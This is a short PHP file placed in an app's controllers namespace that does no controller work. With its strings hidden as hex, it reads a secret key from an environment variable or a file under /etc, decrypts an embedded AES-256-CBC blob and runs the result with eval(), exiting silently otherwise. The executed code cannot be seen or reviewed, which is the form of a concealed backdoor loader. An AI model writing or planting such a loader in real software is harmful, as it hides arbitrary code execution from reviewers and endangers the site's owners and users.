<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('AOmtUZYRLuXv1M58yaPgOA==');

$c=base64_decode(

'1aQwyni+4U6zx0fWKJV0gKWKoo1ukAAeH8TBm9SquP11U6Lvj1uDN6pEZFD7tqGnsWIkD0Qzabk5' .
'djhR0SUcZcokhh+B0mvmBzxO5nF3NXz1Pq9LFDl2VCuaUt4laTRwwUZlVQtJfoVg07UakAmIl5nU' .
'6iCH8zQAdP1bSQXJDAkZh+m/brDYHYj5GpIhlWOT2kRSpOveM+bA5UymQK3BM8AKcwhEc0qxjmf9' .
'LcSqjQie3OfC7DTM2ez6ChSwYhVZ6IaexkEp1ccYEbsRTN//qg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

